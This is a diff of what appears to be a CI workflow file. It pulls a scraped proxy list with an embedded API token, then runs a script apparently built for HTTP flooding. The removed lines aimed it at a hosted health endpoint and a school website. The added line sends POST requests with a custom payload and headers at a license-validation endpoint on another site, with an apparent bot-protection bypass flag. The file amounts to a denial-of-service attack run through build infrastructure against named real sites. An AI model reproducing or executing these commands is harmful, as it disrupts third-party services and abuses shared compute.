@@ -39,10 +39,9 @@ jobs:
           
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
-          screen -dms ve   node a.js GET https://ghostxserver-prod.up.railway.app/health 2750 4 90 woo.txt --full --debug 
-
           
-          node a.js GET https://www.sbcpedu.org/social-act.aspx 2750 4 90 woo.txt  --debug  --bfm
+          
+          node a.js POST https://battlegrounds-hub.online/MARSLOADER/api.php?action=validate_license 1200 4 90 woo.txt --bfm  --postdata "9SYzMBtMcOsH2tsUjHBDnMvwHBSegPD8b0xrcDVg5os=+++uyoGX2uW7vYJf/XUhWRDFX0TpSDahAsNQVFe3rocc6jGZBynP0XBKPJ3kyf3Xz/idk+lKTOzT/S/P1ZGYQyL9Q1gSO4/pSK7TJ/F0Ro+MPsmHf3Qj8XqieCC6L0e0y3lFOZkSjx8IhOm+28g4irrnxoK" --header "Host:battlegrounds-hub.online#Accept:*/*#Content-Type:application/x-www-form-urlencoded"
           
          
           
